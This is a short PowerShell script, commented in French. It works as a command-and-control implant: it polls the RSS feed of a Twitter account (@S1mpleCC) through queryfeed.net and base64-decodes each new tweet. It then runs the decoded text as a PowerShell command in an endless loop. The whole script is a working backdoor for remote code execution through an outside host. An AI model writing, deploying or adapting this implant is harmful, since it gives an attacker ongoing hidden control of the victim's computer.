function Get-LastCmd {
    # On utilise un générateur de feed RSS pour simplifier le parsing du flux Twitter
    $Html = (Invoke-WebRequest -Uri "https://queryfeed.net/tw?q=%40S1mpleCC" -UseBasicParsing).Content

    # On recherche les entrées correspondant à la classe d'un tweet, on récupère le premier (plus récent)
    $RawLastCMD = $html.Split("`n") | ? {$_ -match "CDATA" -and $_ -match "class=`"TweetTextSize"} | Select-Object -First 1

    # On travaille la string pour garder seulement le payload
    $LastCMD = $RawLastCMD.Split(">")[1].Split("<")[0]
    
    return $LastCMD
}

$PrevCmd = ""

while ($true) {
    $MyCmd = Get-LastCmd
    if ($MyCmd -ne $PrevCmd) {
        $PrevCmd = $MyCmd
        $DecCmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($MyCmd))
        Start-Process "powershell.exe" -ArgumentList "-Command `"$($DecCmd)`"" -NoNewWindow
    }
    else {
        Start-Sleep -Seconds 5
    }
}